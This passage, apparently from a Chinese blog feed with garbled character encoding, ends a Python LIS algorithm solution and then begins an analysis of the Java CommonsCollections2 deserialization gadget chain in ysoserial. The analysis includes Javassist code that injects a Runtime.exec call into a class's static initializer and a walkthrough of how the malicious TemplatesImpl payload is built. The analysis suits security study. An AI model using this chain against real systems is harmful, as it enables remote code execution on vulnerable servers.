:rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        nums = [[] <span class="keyword">for</span> i <span class="keyword">in</span> range(k)]</span><br><span class="line">        <span class="comment">#å°†æ•°ç»„åˆ†æˆkä¸ªå­—æ•°ç»„</span></span><br><span class="line">        <span class="keyword">for</span> index,v <span class="keyword">in</span> enumerate(arr):</span><br><span class="line">            nums[index % k].append(v)</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="comment">#print(nums)</span></span><br><span class="line">        <span class="comment">#åˆ†åˆ«å¯¹æ¯ä¸€ä¸ªå­æ•°ç»„æ±‚éœ€è¦ä¿®æ”¹çš„æœ€å°‘æ“ä½œæ¬¡æ•°</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">            res += self.lengthOfLIS(num)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lengthOfLIS</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment">#åŠ¨æ€è§„åˆ’</span></span><br><span class="line">        <span class="keyword">if</span> len(nums) &lt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="comment">#åˆå§‹åŒ–dpæ•°ç»„ï¼Œå…¶ä¸­dp[i]è¡¨ç¤ºiä¹‹å‰åŒ…å«içš„æœ€é•¿ä¸Šå‡å­åºåˆ—çš„é•¿åº¦</span></span><br><span class="line">        dp = [<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums))]</span><br><span class="line">        <span class="comment">#ç”¨æ¥ä¿å­˜æœ€å¤§å€¼</span></span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(nums)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(i):</span><br><span class="line">                <span class="comment">#å¦‚æœå½“å‰içš„å€¼å¤§äºiä¹‹å‰çš„å€¼</span></span><br><span class="line">                <span class="keyword">if</span> nums[i] &gt;= nums[j]:</span><br><span class="line">                    <span class="comment">#åˆ™å¯¹å½“å‰dp[i]ä¸­çš„å€¼è¿›è¡Œæ›´æ–°</span></span><br><span class="line">                    dp[i] = max(dp[i],dp[j]+<span class="number">1</span>)</span><br><span class="line">            <span class="comment">#å¦‚æœå½“å‰dp[i]çš„å€¼å¤§äºresçš„å€¼ï¼Œåˆ™æ›´æ–°res</span></span><br><span class="line">            <span class="keyword">if</span> dp[i] &gt; res:</span><br><span class="line">                res = dp[i]</span><br><span class="line">        <span class="comment">#resæ˜¯æœ€é•¿é€’å¢å­åºåˆ—ï¼Œé•¿åº¦å‡å»ä¹‹åå°±æ˜¯éœ€è¦ä¿®æ”¹çš„ä¸ªæ•°</span></span><br><span class="line">        <span class="keyword">return</span> len(nums) - res</span><br></pre></td></tr></table></figure><p>è¶…æ—¶äº†ã€‚ã€‚ã€‚ã€‚ğŸ˜­</p><p>å¦å¤–ä¸€ç§åšæ³•ï¼Œæ²¡è¶…æ—¶ğŸ¶ï¼ŒåŸºæœ¬æ€è·¯è¿˜æ˜¯ä¸€æ ·çš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">kIncreasing</span><span class="params">(self, arr, k)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type arr: List[int]</span></span><br><span class="line"><span class="string">        :type k: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        nums = [[] <span class="keyword">for</span> i <span class="keyword">in</span> range(k)]</span><br><span class="line">        <span class="comment">#å°†æ•°ç»„åˆ†æˆkä¸ªå­—æ•°ç»„</span></span><br><span class="line">        <span class="keyword">for</span> index,v <span class="keyword">in</span> enumerate(arr):</span><br><span class="line">            nums[index % k].append(v)</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="comment">#print(nums)</span></span><br><span class="line">        <span class="comment">#åˆ†åˆ«å¯¹æ¯ä¸€ä¸ªå­æ•°ç»„æ±‚éœ€è¦ä¿®æ”¹çš„æœ€å°‘æ“ä½œæ¬¡æ•°</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">            res += self.lengthOfLIS(num)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lengthOfLIS</span><span class="params">(self,nums)</span>:</span></span><br><span class="line">            dp = []</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> nums:</span><br><span class="line">                pos = bisect_right(dp, x)</span><br><span class="line">                <span class="keyword">if</span> pos == len(dp):</span><br><span class="line">                    dp.append(x)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    dp[pos] = x</span><br><span class="line">            <span class="keyword">return</span> len(nums) - len(dp)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;æ‰¾å‡ºæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå›æ–‡å­—ç¬¦ä¸²&quot;&gt;&lt;a href=&quot;#æ‰¾å‡ºæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå›æ–‡å­—ç¬¦ä¸²&quot; class=&quot;headerlink&quot; title=&quot;æ‰¾å‡ºæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå›æ–‡å­—ç¬¦ä¸²&quot;&gt;&lt;/a&gt;æ‰¾å‡ºæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå›æ–‡å­—ç¬¦ä¸²&lt;/h4&gt;&lt;figure class=&quot;highlight 
      
    
    </summary>
    
    
      <category term="Algorithm" scheme="elssm.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>Java CC2é“¾å¤ç°ä¸åˆ†æ</title>
    <link href="elssm.github.io/2021/12/15/Java-CC2%E9%93%BE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
    <id>elssm.github.io/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/</id>
    <published>2021-12-15T01:16:42.000Z</published>
    <updated>2021-12-15T03:59:52.874Z</updated>
    
    <content type="html"><![CDATA[<h4 id="å¤ç°ç¯å¢ƒ"><a href="#å¤ç°ç¯å¢ƒ" class="headerlink" title="å¤ç°ç¯å¢ƒ"></a>å¤ç°ç¯å¢ƒ</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Mac OS Big Sur</span><br><span class="line">JDK-7u6</span><br><span class="line">commons-collections4-4.0</span><br><span class="line">tomcat8</span><br></pre></td></tr></table></figure><p><code>Ysoserial</code>ç¯å¢ƒå’Œ<code>Web Server</code>ç¯å¢ƒé…ç½®å’Œ<a href="http://elssm.top/2021/12/13/Ysoserial%E5%AD%A6%E4%B9%A0/#more" target="_blank" rel="noopener">è¿™é‡Œçš„é…ç½®</a>æ˜¯ä¸€æ ·çš„ã€‚</p><h4 id="CC2å¤ç°"><a href="#CC2å¤ç°" class="headerlink" title="CC2å¤ç°"></a>CC2å¤ç°</h4><h5 id="Payloadç”Ÿæˆ"><a href="#Payloadç”Ÿæˆ" class="headerlink" title="Payloadç”Ÿæˆ"></a>Payloadç”Ÿæˆ</h5><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/1.png" alt="1"></p><h5 id="Payloadæµ‹è¯•"><a href="#Payloadæµ‹è¯•" class="headerlink" title="Payloadæµ‹è¯•"></a>Payloadæµ‹è¯•</h5><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/2.png" alt="2"></p><p>å¤ç°æˆåŠŸ</p><h4 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h4><h5 id="Javassist"><a href="#Javassist" class="headerlink" title="Javassist"></a>Javassist</h5><p>Javassistæ˜¯ç”¨æ¥å¤„ç†javaå­—èŠ‚ç çš„ç±»åº“ï¼Œ javaå­—èŠ‚ç ä¸€èˆ¬å­˜æ”¾åœ¨åç¼€åç§°ä¸ºclassçš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ã€‚æ¯ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶éƒ½åŒ…å«ä¸€ä¸ªjavaç±»æˆ–è€…æ˜¯javaæ¥å£ã€‚å¯¹äºJavassistæœ‰å¾ˆå¤šçŸ¥è¯†ç‚¹ï¼Œè¿™é‡Œæˆ‘ä»¬ä»…ä»…è¯´å‡ ä¸ªpayloadä¸­ç”¨åˆ°çš„ä¸€äº›ç”¨æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ClassPoolï¼šä¸€ä¸ªåŸºäºå“ˆå¸Œè¡¨å®ç°çš„CtClasså¯¹è±¡å®¹å™¨ï¼Œå…¶ä¸­é”®åæ˜¯ç±»åç§°ï¼Œå€¼æ˜¯è¡¨ç¤ºè¯¥ç±»çš„CtClasså¯¹è±¡</span><br><span class="line">  å¸¸ç”¨æ–¹æ³•å¦‚ä¸‹</span><br><span class="line">  getDefault()ï¼šå•ä¾‹è·å–ClassPoolï¼Œä¸»è¦ç”¨æ¥ä¿®æ”¹å­—èŠ‚ç ï¼Œé‡Œé¢å­˜å‚¨åŸºäºäºŒè¿›åˆ¶æ–‡ä»¶æ„å»ºçš„CtClasså¯¹è±¡</span><br><span class="line">  get()ï¼šæ ¹æ®åç§°è·å–CtClasså¯¹è±¡</span><br><span class="line">  makeClassInitializerï¼šåœ¨å½“å‰ç±»ä¸­åˆ›å»ºä¸€ä¸ªé™æ€ä»£ç å—</span><br><span class="line">  insertBeforeï¼šåœ¨é™æ€ä»£ç å—çš„å¼€å¤´æ’å…¥æºä»£ç </span><br><span class="line">CtClassï¼šä¸€ä¸ªCtClasså¯¹è±¡å¯ä»¥å¤„ç†ä¸€ä¸ª<span class="class"><span class="keyword">class</span>æ–‡ä»¶ï¼Œè¿™äº›<span class="title">CtClass</span>å¯¹è±¡å¯ä»¥ä»<span class="title">ClassPool</span>çš„ä¸€äº›æ–¹æ³•è·å¾—ã€‚</span></span><br><span class="line"><span class="class">  å¸¸ç”¨æ–¹æ³•å¦‚ä¸‹</span></span><br><span class="line"><span class="class">  <span class="title">writeFile</span>ï¼šå°†ç”Ÿæˆçš„ç±»å†™å…¥æ–‡ä»¶</span></span><br><span class="line"><span class="class">  <span class="title">toClass</span>ï¼šæ‹¿åˆ°ç”Ÿæˆçš„ç±»</span></span><br><span class="line"><span class="class">  <span class="title">newInstance</span>ï¼šè·å–å®ä¾‹å¯¹è±¡</span></span><br></pre></td></tr></table></figure><p>ä¸¾ä¸€ä¸ªä¾‹å­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> javatest;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">javas</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, IOException, InstantiationException, IllegalAccessException </span>&#123;</span><br><span class="line">        <span class="comment">//è·å–ClassPoolå®ä¾‹ï¼Œä¸»è¦ç”¨æ¥ä¿®æ”¹å­—èŠ‚ç ï¼Œé‡Œé¢å­˜å‚¨åŸºäºäºŒè¿›åˆ¶æ–‡ä»¶æ„å»ºçš„CtClasså¯¹è±¡</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//é€šè¿‡getæ–¹æ³•ï¼Œè·å–CtClasså¯¹è±¡ï¼Œå°†è·å–åˆ°çš„CtClasså¯¹è±¡èµ‹å€¼ç»™ccå˜é‡</span></span><br><span class="line">        <span class="comment">//ClassPoolä¸­æœ‰ä¸€å¼ ä¿å­˜CtClassä¿¡æ¯çš„HashTableï¼Œåœ¨è¯¥HashTableä¸­Keyä¸ºç±»åï¼Œvalueä¸ºç±»å¯¹åº”çš„CtClasså¯¹è±¡</span></span><br><span class="line">        CtClass cc = pool.get(javas<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        <span class="comment">//æœ‰äº†CtClasså®ä¾‹å¯¹è±¡ï¼Œå°±å¯ä»¥å¤„ç†ç±»æ–‡ä»¶ï¼Œç¼–è¾‘æˆ–è€…ä¿®æ”¹ç±»</span></span><br><span class="line">        <span class="comment">//å› ä¸ºæ·»åŠ çš„å†…å®¹éƒ½æ˜¯å®Œæ•´çš„javaæºä»£ç ï¼Œå› æ­¤å¼•å·è¦è¿›è¡Œè½¬ä¹‰å¤„ç†</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open -a calculator\");"</span>;</span><br><span class="line">        <span class="comment">//makeClassInitializerï¼šåœ¨å½“å‰ç±»(javas)ä¸­åˆ›å»ºä¸€ä¸ªé™æ€ä»£ç å—</span></span><br><span class="line">        <span class="comment">//insertBeforeï¼šåœ¨é™æ€ä»£ç å—çš„å¼€å¤´æ’å…¥æºä»£ç </span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">"Elssm"</span> + System.nanoTime();</span><br><span class="line">        <span class="comment">//setNameï¼šè®¾ç½®ç±»åï¼Œä½¿ç”¨System.nanoTimeä¸ºäº†ä¸è®©ç±»åé‡å¤</span></span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//writeFileï¼šå°†ç”Ÿæˆçš„ç±»å†™å…¥æ–‡ä»¶</span></span><br><span class="line">        cc.writeFile(<span class="string">"/Users/caoyifan/IdeaProjects/WebTest/src/javatest/"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç ä¼šåœ¨æŒ‡å®šæ–‡ä»¶ä¸‹ç”Ÿæˆä¸€ä¸ªæ–°çš„å­—èŠ‚ç æ–‡ä»¶ã€‚æˆ‘ä»¬å‘ç°ï¼ŒåŠ¨æ€ç”Ÿæˆçš„ç±»åœ¨åŸæœ‰ç±»çš„åŸºç¡€ä¸Šæ·»åŠ äº†é™æ€ä»£ç å—ï¼Œå¦‚æœæˆ‘ä»¬åŠ è½½è¿™ä¸ªç±»çš„è¯ï¼Œé™æ€ä»£ç å—ä¸­çš„å†…å®¹å°±ä¼šè¢«æ‰§è¡Œã€‚</p><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/3.png" alt="3"></p><p>ç°åœ¨æˆ‘ä»¬é€šè¿‡<code>toClass</code>æ‹¿åˆ°ç”Ÿæˆçš„ç±»ï¼Œå¹¶é€šè¿‡<code>newInstance</code>è·å–å®ä¾‹å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> javatest;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">javas</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, IOException, InstantiationException, IllegalAccessException </span>&#123;</span><br><span class="line">        <span class="comment">//è·å–ClassPoolå®ä¾‹ï¼Œä¸»è¦ç”¨æ¥ä¿®æ”¹å­—èŠ‚ç ï¼Œé‡Œé¢å­˜å‚¨åŸºäºäºŒè¿›åˆ¶æ–‡ä»¶æ„å»ºçš„CtClasså¯¹è±¡</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//é€šè¿‡getæ–¹æ³•ï¼Œè·å–CtClasså¯¹è±¡ï¼Œå°†è·å–åˆ°çš„CtClasså¯¹è±¡èµ‹å€¼ç»™ccå˜é‡</span></span><br><span class="line">        <span class="comment">//ClassPoolä¸­æœ‰ä¸€å¼ ä¿å­˜CtClassä¿¡æ¯çš„HashTableï¼Œåœ¨è¯¥HashTableä¸­Keyä¸ºç±»åï¼Œvalueä¸ºç±»å¯¹åº”çš„CtClasså¯¹è±¡</span></span><br><span class="line">        CtClass cc = pool.get(javas<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        <span class="comment">//æœ‰äº†CtClasså®ä¾‹å¯¹è±¡ï¼Œå°±å¯ä»¥å¤„ç†ç±»æ–‡ä»¶ï¼Œç¼–è¾‘æˆ–è€…ä¿®æ”¹ç±»</span></span><br><span class="line">        <span class="comment">//å› ä¸ºæ·»åŠ çš„å†…å®¹éƒ½æ˜¯å®Œæ•´çš„javaæºä»£ç ï¼Œå› æ­¤å¼•å·è¦è¿›è¡Œè½¬ä¹‰å¤„ç†</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open -a calculator\");"</span>;</span><br><span class="line">        <span class="comment">//makeClassInitializerï¼šåœ¨å½“å‰ç±»(javas)ä¸­åˆ›å»ºä¸€ä¸ªé™æ€ä»£ç å—</span></span><br><span class="line">        <span class="comment">//insertBeforeï¼šåœ¨é™æ€ä»£ç å—çš„å¼€å¤´æ’å…¥æºä»£ç </span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">"Elssm"</span> + System.nanoTime();</span><br><span class="line">        <span class="comment">//setNameï¼šè®¾ç½®ç±»åï¼Œä½¿ç”¨System.nanoTimeä¸ºäº†ä¸è®©ç±»åé‡å¤</span></span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        <span class="comment">//toClassï¼šæ‹¿åˆ°ç”Ÿæˆçš„ç±»</span></span><br><span class="line">        <span class="comment">//newInstanceï¼šè·å–å®ä¾‹å¯¹è±¡</span></span><br><span class="line">        cc.toClass().newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/4.png" alt="4"></p><h5 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h5><p>PriorityQueueå®é™…ä¸Šæ˜¯ä¸€ä¸ªå †ï¼ˆä¸æŒ‡å®šComparatoræ—¶é»˜è®¤ä¸ºæœ€å°å †ï¼‰ï¼Œé˜Ÿåˆ—æ—¢å¯ä»¥æ ¹æ®å…ƒç´ çš„è‡ªç„¶é¡ºåºæ¥æ’åºï¼Œä¹Ÿå¯ä»¥æ ¹æ® Comparatoræ¥è®¾ç½®æ’åºè§„åˆ™ã€‚é˜Ÿåˆ—çš„å¤´æ˜¯æŒ‰æŒ‡å®šæ’åºæ–¹å¼çš„æœ€å°å…ƒç´ ã€‚å¦‚æœå¤šä¸ªå…ƒç´ éƒ½æ˜¯æœ€å°å€¼ï¼Œåˆ™å¤´æ˜¯å…¶ä¸­ä¸€ä¸ªå…ƒç´ ã€‚æ–°å»ºå¯¹è±¡çš„æ—¶å€™å¯ä»¥æŒ‡å®šä¸€ä¸ªåˆå§‹å®¹é‡ï¼Œå…¶å®¹é‡ä¼šè‡ªåŠ¨å¢åŠ ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueueä¼˜å…ˆçº§é˜Ÿåˆ—çš„å‡½æ•°å®šä¹‰</span><br><span class="line">add() : åœ¨ä¼˜å…ˆçº§é˜Ÿåˆ—çš„é˜Ÿå°¾æ’å…¥å…ƒç´  , æ’å…¥å¤±è´¥åˆ™æŠ›å‡ºå¼‚å¸¸.</span><br><span class="line">offer() : åœ¨ä¼˜å…ˆçº§é˜Ÿåˆ—çš„é˜Ÿå°¾æ’å…¥å…ƒç´  , æ’å…¥å¤±è´¥åˆ™è¿”å› <span class="keyword">null</span>.</span><br><span class="line">element() : è·å–ä½†ä¸åˆ é™¤ä¼˜å…ˆçº§é˜Ÿåˆ—çš„é˜Ÿé¦–å…ƒç´  , è·å–å¤±è´¥æ—¶æŠ›å‡ºå¼‚å¸¸.</span><br><span class="line">peek() : è·å–ä½†ä¸åˆ é™¤ä¼˜å…ˆçº§é˜Ÿåˆ—çš„é˜Ÿé¦–å…ƒç´  , è·å–å¤±è´¥æ—¶è¿”å› <span class="keyword">null</span>.</span><br><span class="line">remove : è·å–ä¸”åˆ é™¤ä¼˜å…ˆçº§é˜Ÿåˆ—çš„é˜Ÿé¦–å…ƒç´  , è·å–å¤±è´¥æ—¶æŠ›å‡ºå¼‚å¸¸.</span><br><span class="line">poll() : è·å–ä¸”åˆ é™¤ä¼˜å…ˆçº§é˜Ÿåˆ—çš„é˜Ÿé¦–å…ƒç´  , è·å–å¤±è´¥æ—¶è¿”å› <span class="keyword">null</span>.</span><br></pre></td></tr></table></figure><h4 id="Ysoserial-Payloadç”Ÿæˆåˆ†æ"><a href="#Ysoserial-Payloadç”Ÿæˆåˆ†æ" class="headerlink" title="Ysoserial Payloadç”Ÿæˆåˆ†æ"></a>Ysoserial Payloadç”Ÿæˆåˆ†æ</h4><h5 id="createTemplatesImpl"><a href="#createTemplatesImpl" class="headerlink" title="createTemplatesImpl"></a>createTemplatesImpl</h5><p>åœ¨ç”ŸæˆCC2 Payloadçš„æ—¶å€™ï¼Œé¦–å…ˆæ‰§è¡Œçš„æ˜¯<code>Gadgets.createTemplatesImpl(command)</code></p><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/5.png" alt="5"></p><p>åœ¨<code>createTemplatesImpl</code>æ–¹æ³•ä¸­é¦–å…ˆä¼šé€šè¿‡<code>getProperty</code>æ–¹æ³•è·å–ç³»ç»Ÿå±æ€§<code>properXalan</code>çš„å€¼ï¼Œ<code>properXalan</code>çš„é»˜è®¤å±æ€§æ˜¯<code>false</code>ï¼Œé€šè¿‡è°ƒè¯•å‘ç°èµ°çš„æ˜¯ä¸‹é¢çš„<code>return</code>æ¡ä»¶ã€‚</p><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/6.png" alt="6"></p><p>è·Ÿè¿›å‘ç°ï¼Œé¦–å…ˆè·å–äº†<code>TemplatesImpl</code>çš„å®ä¾‹å¯¹è±¡ã€‚ä¹‹åé€šè¿‡<code>Javassist</code>åŠ¨æ€ä¿®æ”¹<code>StubTransletPayload</code>ç±»ã€‚</p><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/7.png" alt="7"></p><p>æ¥ç€é€šè¿‡<code>get</code>æ–¹æ³•è·å–<code>abstTranslet</code>ç±»ï¼Œå¹¶é€šè¿‡<code>setSuperclass</code>å°†è¯¥ç±»ä½œä¸ºæ–°å»ºç±»çš„çˆ¶ç±»ï¼Œå› ä¸ºåœ¨å‰é¢æˆ‘ä»¬è·å–åˆ°äº†<code>StubTransletPayload</code>ç±»ï¼Œè€Œ<code>StubTransletPayload</code>æ˜¯ç»§æ‰¿<code>abstTranslet</code>ç±»çš„</p><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/8.png" alt="8"></p><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/9.png" alt="9"></p><p>é€šè¿‡ä¸Šè¿°<code>Javassist</code>æ“ä½œï¼Œå°±å¯ä»¥å°†æˆ‘ä»¬å†™çš„æ¶æ„ä»£ç æ³¨å…¥åˆ°æ–°çš„å­—èŠ‚ç æ–‡ä»¶ä¸­ä¸­çš„é™æ€ä»£ç å—éƒ¨åˆ†</p><p>ä¹‹åé€šè¿‡<code>CtClass.toBytecode</code>æ–¹æ³•è·å–åˆ°æ¶æ„ç±»çš„å­—èŠ‚ç ï¼Œå¹¶é€šè¿‡javaåå°„æœºåˆ¶å°†å­—èŠ‚ç å¡«å……åˆ°<code>TemplatesImpl</code>å®ä¾‹å¯¹è±¡çš„<code>_bytecodes</code>æ•°ç»„ä¸­ã€‚</p><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/10.png" alt="10"></p><p>ä¹‹åå¡«å……äº†<code>_name</code>å’Œ<code>_tfactory</code>å­—æ®µï¼Œå¹¶å°†<code>TemplatesImpl</code>å®ä¾‹å¯¹è±¡è¿”å›</p><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/11.png" alt="11"></p><h5 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h5><p>è¿”å›<code>TemplatesImpl</code>å®ä¾‹å¯¹è±¡ä¹‹åï¼Œæ¥ç€è·å–äº†<code>InvokerTransformer</code>å®ä¾‹å¯¹è±¡ï¼Œå¹¶åšäº†ä¸€äº›åˆå§‹åŒ–ã€‚</p><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/12.png" alt="12"></p><h5 id="PriorityQueue-1"><a href="#PriorityQueue-1" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h5><p>æ¥ç€åˆ›å»ºä¸€ä¸ªä¼˜å…ˆçº§é˜Ÿåˆ—ï¼ŒæŒ‡å®šé˜Ÿåˆ—çš„åˆå§‹å®¹é‡å’Œæ¯”è¾ƒå™¨ã€‚ç„¶åå¡«å……äº†ä¸¤ä¸ª1æ¥å ä½åˆå§‹åŒ–ã€‚</p><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/13.png" alt="13"></p><p>åœ¨ä¼˜å…ˆçº§é˜Ÿåˆ—é‡Œï¼Œé€šè¿‡<code>TransformingComparator(transformer)</code>è·å–æ„é€ å™¨å®ä¾‹å¯¹è±¡ï¼Œæ­¤æ—¶çš„<code>transformer</code>å°±æ˜¯ä¸Šé¢<code>InvokerTransformer</code>ç±»å‹çš„<code>transformer</code>å®ä¾‹å¯¹è±¡ã€‚</p><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/14.png" 